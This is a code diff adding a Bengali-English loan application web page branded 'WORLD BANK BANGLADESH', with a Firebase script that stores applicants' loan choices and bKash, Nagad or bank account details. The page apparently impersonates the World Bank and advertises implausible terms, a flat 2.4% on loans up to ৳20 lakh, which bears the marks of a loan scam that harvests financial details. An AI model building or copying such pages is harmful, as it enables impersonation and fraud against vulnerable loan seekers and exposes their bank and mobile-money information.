@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Loan Information</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+background:#f1f5f9;
+}
+
+.container{
+max-width:420px;
+margin:30px auto;
+background:white;
+padding:20px;
+border-radius:20px;
+box-shadow:0 0 15px rgba(0,0,0,0.1);
+}
+
+.header{
+background:#0047d4;
+color:white;
+padding:20px;
+text-align:center;
+font-size:24px;
+font-weight:bold;
+border-radius:15px;
+margin-bottom:20px;
+}
+
+.title{
+text-align:center;
+font-size:22px;
+font-weight:bold;
+margin-bottom:20px;
+}
+
+label{
+font-weight:bold;
+font-size:14px;
+}
+
+select,input{
+width:100%;
+padding:14px;
+margin-top:8px;
+margin-bottom:15px;
+border-radius:12px;
+border:1px solid #cbd5e1;
+box-sizing:border-box;
+font-size:15px;
+}
+
+.summary{
+background:#eff6ff;
+padding:20px;
+border-radius:15px;
+text-align:center;
+margin-top:20px;
+margin-bottom:20px;
+}
+
+button{
+width:100%;
+padding:15px;
+background:#0047d4;
+color:white;
+border:none;
+border-radius:15px;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="header">
+
+🌐 WORLD BANK BANGLADESH
+
+</div>
+
+<div class="title">
+
+Loan Information
+
+</div>
+
+<label>
+Select Loan Amount / লোনের পরিমাণ
+</label>
+
+<select id="loanAmount" onchange="calculateLoan()">
+
+<option value="" selected disabled>
+
+▼ Select Loan Amount
+
+</option>
+
+<option value="50000">
+৳50,000
+</option>
+
+<option value="100000">
+৳100,000
+</option>
+
+<option value="150000">
+৳150,000
+</option>
+
+<option value="200000">
+৳200,000
+</option>
+
+<option value="300000">
+৳300,000
+</option>
+
+<option value="400000">
+৳400,000
+</option>
+
+<option value="500000">
+৳500,000
+</option>
+
+<option value="600000">
+৳600,000
+</option>
+
+<option value="700000">
+৳700,000
+</option>
+
+<option value="800000">
+৳800,000
+</option>
+
+<option value="900000">
+৳900,000
+</option>
+
+<option value="1000000">
+৳10,00,000
+</option>
+
+<option value="1500000">
+৳15,00,000
+</option>
+
+<option value="2000000">
+৳20,00,000
+</option>
+
+</select>
+
+<label>
+Loan Duration / লোনের সময়
+</label>
+
+<select id="loanDuration" onchange="calculateLoan()">
+
+<option value="" selected disabled>
+
+▼ Select Loan Duration
+
+</option>
+
+<option value="12">
+12 Month / 1 Year
+</option>
+
+<option value="24">
+24 Month / 2 Year
+</option>
+
+<option value="36">
+36 Month / 3 Year
+</option>
+
+<option value="48">
+48 Month / 4 Year
+</option>
+
+<option value="60">
+60 Month / 5 Year
+</option>
+
+</select>
+
+<div class="summary">
+
+<h2>
+
+Loan Summary
+
+</h2>
+
+<p>
+
+Interest Rate: 2.4%
+
+</p>
+
+<p id="monthly">
+
+Monthly Installment: ৳0
+
+</p>
+
+<p id="total">
+
+Total Payable Amount: ৳0
+
+</p>
+
+</div>
+
+<label>
+Receive Method / টাকা গ্রহণ পদ্ধতি
+</label>
+
+<select id="method" onchange="showMethod()">
+
+<option value="" selected disabled>
+
+▼ Select Bank Info
+
+</option>
+
+<option>
+bKash
+</option>
+
+<option>
+Nagad
+</option>
+
+<option>
+Bank
+</option>
+
+</select>
+
+<div id="bkashBox">
+
+<input
+type="text"
+id="bankNumber"
+placeholder="bKash / Nagad Number">
+
+</div>
+
+<div
+id="bankBox"
+style="display:none;">
+
+<input
+type="text"
+id="accountHolder"
+placeholder="Account Holder Name">
+
+<input
+type="text"
+id="bankName"
+placeholder="Bank Name">
+
+<input
+type="text"
+id="accountNumber"
+placeholder="Account Number">
+
+</div>
+
+<button
+type="button"
+onclick="submitLoan()">
+
+Submit Application
+
+</button>
+
+</div>
+
+<script type="module">
+
+import { initializeApp }
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+getFirestore,
+doc,
+setDoc
+
+}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyDoviQemxQYk-nel7Zc8cAzZhWJvxzbMcc",
+
+authDomain: "loan-a87af.firebaseapp.com",
+
+projectId: "loan-a87af",
+
+storageBucket: "loan-a87af.firebasestorage.app",
+
+messagingSenderId: "661290569837",
+
+appId: "1:661290569837:web:0f03ecdfde2da0867def64",
+
+measurementId: "G-2EMLCYHVWT"
+
+};
+
+const app =
+initializeApp(firebaseConfig);
+
+const db =
+getFirestore(app);
+
+/* SUBMIT */
+
+window.submitLoan =
+async function(){
+
+try{
+
+let loanAmount =
+document.getElementById("loanAmount").value;
+
+let loanDuration =
+document.getElementById("loanDuration").value;
+
+let method =
+document.getElementById("method").value;
+
+let bankNumber =
+document.getElementById("bankNumber").value;
+
+let accountHolder =
+document.getElementById("accountHolder").value;
+
+let bankName =
+document.getElementById("bankName").value;
+
+let accountNumber =
+document.getElementById("accountNumber").value;
+
+if(
+loanAmount=="" ||
+loanDuration=="" ||
+method==""
+){
+
+alert("সব তথ্য পূরণ করুন");
+
+return;
+
+}
+
+/* METHOD VALIDATION */
+
+if(
+(method=="bKash" || method=="Nagad")
+&&
+bankNumber==""
+){
+
+alert("মোবাইল ব্যাংকিং নাম্বার দিন");
+
+return;
+
+}
+
+if(
+method=="Bank"
+&&
+(
+accountHolder=="" ||
+bankName=="" ||
+accountNumber==""
+)
+){
+
+alert("সব ব্যাংক তথ্য পূরণ করুন");
+
+return;
+
+}
+
+let mobile =
+localStorage.getItem("userMobile");
+
+if(!mobile){
+
+alert("User Login Not Found");
+
+return;
+
+}
+
+await setDoc(doc(db,"users",mobile),{
+
+loanAmount:loanAmount,
+
+loanDuration:loanDuration,
+
+method:method,
+
+bankNumber:bankNumber,
+
+accountHolder:accountHolder,
+
+bankName:bankName,
+
+accountNumber:accountNumber,
+
+status:"pending",
+
+approvedAmount:"0"
+
+},{merge:true});
+
+alert("Loan Application Submitted");
+
+window.location.href =
+"dashboard.html";
+
+}
+
+catch(error){
+
+alert(error.message);
+
+}
+
+}
+
+/* METHOD */
+
+window.showMethod =
+function(){
+
+var method =
+document.getElementById("method").value;
+
+if(method=="Bank"){
+
+document.getElementById("bankBox").style.display =
+"block";
+
+document.getElementById("bkashBox").style.display =
+"none";
+
+}
+
+else{
+
+document.getElementById("bankBox").style.display =
+"none";
+
+document.getElementById("bkashBox").style.display =
+"block";
+
+}
+
+}
+
+/* CALCULATION */
+
+window.calculateLoan =
+function(){
+
+let amount =
+parseInt(document.getElementById("loanAmount").value);
+
+let months =
+parseInt(document.getElementById("loanDuration").value);
+
+if(!amount || !months){
+
+document.getElementById("monthly").innerHTML =
+"Monthly Installment: ৳0";
+
+document.getElementById("total").innerHTML =
+"Total Payable Amount: ৳0";
+
+return;
+
+}
+
+let interestRate = 2.4 / 100;
+
+let total =
+amount + (amount * interestRate);
+
+let monthly =
+Math.round(total / months);
+
+document.getElementById("monthly").innerHTML =
+"Monthly Installment: ৳" + monthly;
+
+document.getElementById("total").innerHTML =
+"Total Payable Amount: ৳" + Math.round(total);
+
+}
+
+</script>
+
+</body>
+
+</html>
